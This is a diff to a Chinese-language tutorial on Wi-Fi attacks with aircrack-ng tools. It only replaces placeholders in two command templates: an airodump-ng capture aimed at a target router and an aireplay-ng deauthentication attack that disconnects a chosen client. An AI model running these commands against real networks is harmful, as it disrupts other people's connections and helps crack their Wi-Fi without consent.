@@ -35,7 +35,7 @@ airodump-ng wlan0mon
 - 根据自己的情况进行替换
   - 先启用抓包命令
   ```
-  airodump-ng -c <ID> –bssid <目标路由器Mac地址> -w <保存的路径/文件名> wlan0
+  airodump-ng -c <无线网络的信道号> –bssid <目标路由器Mac地址> -w <保存的路径/文件名> <无线网卡接口>
   ```
   示例：
   ```
@@ -53,7 +53,7 @@ airodump-ng wlan0mon
   </pre>
   - ACK 死亡攻击：
   ```
-  aireplay-ng -0 <攻击次数> -a <目标路由器Mac地址> -c <要攻击的目标Mac地址> wlan0
+  aireplay-ng -0 <攻击次数> -a <目标路由器Mac地址> -c <要攻击的目标Mac地址> <无线网卡接口>
   ```
   示例
   ```
